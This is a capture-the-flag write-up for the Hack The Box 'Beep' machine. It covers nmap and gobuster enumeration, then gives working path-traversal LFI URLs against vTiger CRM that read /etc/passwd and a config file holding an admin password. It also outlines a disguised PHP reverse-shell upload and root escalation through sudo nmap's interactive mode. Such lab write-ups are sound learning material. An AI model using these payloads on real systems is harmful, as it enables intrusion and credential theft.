# BEEP

Beep was an easy linux box that requried an interesting LFI exploit to read the user flag which lead to another lfi to read a file containing creds. There was multiple methodds for root including a simple ssh as root or spawning a reverse shell on the system and privelage escalating to root via sudo -l and exploiting nmap
> Nmap

```shell
root@kali:~/boxes/beep/# nmap -sS -A 10.10.10.7

Starting Nmap 7.50 ( https://nmap.org ) at 2018-03-03 04:36 EST
Nmap scan report for 10.10.10.7
Host is up (0.16s latency).
Not shown: 988 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
| 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp open smtp Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp open http Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp open rpcbind 2 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2 111/tcp rpcbind
| 100000 2 111/udp rpcbind
| 100024 1 742/udp status
|_ 100024 1 745/tcp status
143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK ATOMIC URLAUTHA0001 RIGHTS=kxte IMAP4rev1 THREAD=ORDEREDSUBJECT LITERAL+ ANNOTATEMORE LIST-SUBSCRIBED CONDSTORE UIDPLUS CATENATE BINARY MAILBOX-REFERRALS LISTEXT IDLE RENAME ID IMAP4 QUOTA X-NETSCAPE THREAD=REFERENCES SORT=MODSEQ SORT CHILDREN NAMESPACE MULTIAPPEND STARTTLS NO ACL UNSELECT
443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after: 2018-04-07T08:22:08
|_ssl-date: 2018-03-03T09:21:37+00:00; -19m56s from scanner time.
993/tcp open ssl/imap Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp open pop3Cyrus pop3d
3306/tcp open mysql MySQL (unauthorized)
4445/tcp open upnotifyp?
10000/tcp open http MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint:
OS:SCAN(V=7.50%E=4%D=3/3%OT=22%CT=1%CU=41868%PV=Y%DS=2%DC=T%G=Y%TM=5A9A6E1C
OS:%P=i686-pc-linux-gnu)SEQ(SP=CB%GCD=2%ISR=CD%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=C
OS:B%GCD=1%ISR=CC%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DN
OS:NT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3
OS:=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N
OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A
OS:0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
OS:%DFI=N%T=40%CD=S)
```
Our nmap scan shows alot of information but we narrow down and try to take away the important details.

On port `80` the service `elastix` is running. It is just simply a login page for what should be htb elastix service which we will need to exploit later.

We run a gobuster scan in dir mode to check for hidden directories to help our enumeration.

```shell
root@kali:~/Desktop# gobuster -e -u https://10.10.10.7/ -t 500 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

Gobuster v1.2 OJ Reeves (@TheColonial)
=====================================================
[+] Mode : dir
[+] Url/Domain : https://10.10.10.7/
[+] Threads : 500
[+] Wordlist : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded : true
=====================================================
https://10.10.10.7/help (Status: 301)
https://10.10.10.7/modules (Status: 301)
https://10.10.10.7/themes (Status: 301)
https://10.10.10.7/lang (Status: 301)
https://10.10.10.7/static (Status: 301)
https://10.10.10.7/admin (Status: 301)
https://10.10.10.7/images (Status: 301)
https://10.10.10.7/var (Status: 301)
https://10.10.10.7/mail (Status: 301)
https://10.10.10.7/panel (Status: 301)
https://10.10.10.7/libs (Status: 301)
https://10.10.10.7/recordings (Status: 301)
https://10.10.10.7/configs (Status: 301)
https://10.10.10.7/vtigercrm (Status: 301)
```

We take a look at the `/vtingercrm` we can see that its running the `vtingercrm` service.

We search for epxloits and comme accross one on exploit-db that shows that it is an LFI and we can read the user flag an any other file with permissions for read access from the user.

> Links [https://www.exploit-db.com/exploits/18770](https://www.exploit-db.com/exploits/18770)

We use this and carry out a few commands like this:

```shell
https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

With this we can read the` /etc/passwd` file and it shows a user called `fanis` from here we can change the file name to try and raed the user flag.
```shell
https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.ph
p?module_name=../../../../../../../../home/fanis/user.txt%00

And we get user on the box!

# ROOT
Now using the second LIF that we found on exploit db [https://www.exploit-db.com/exploits/37637](https://www.exploit-db.com/exploits/37637)
```shell
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

We do this and we read the creds for the administrator for the vtigercrm service 

```Username = admin
Password = jEhdIekWmdjE
```
From here we can simply ssh as root into the box and read the root flag. This is the first method.

I wont cover the rest fully i was do a quick brief.

For root 1 method you can login into vtiger with the creds and navigating around the website you will find an upload section where you can upload a jpg file. We can upload a php reverse shell aslong as we name it shell.php.jpg and we can change the contents in burpsuite to change the needs required, from here we set up a listener and we get a shell.

For the priv esc we run `sudo -l` shows us that we can run nmap as root. We simply run `sudo nmap --interactive` to spawn a shell with interactive mode on nmap.

Thanks for reading hpoe you enjoyed.
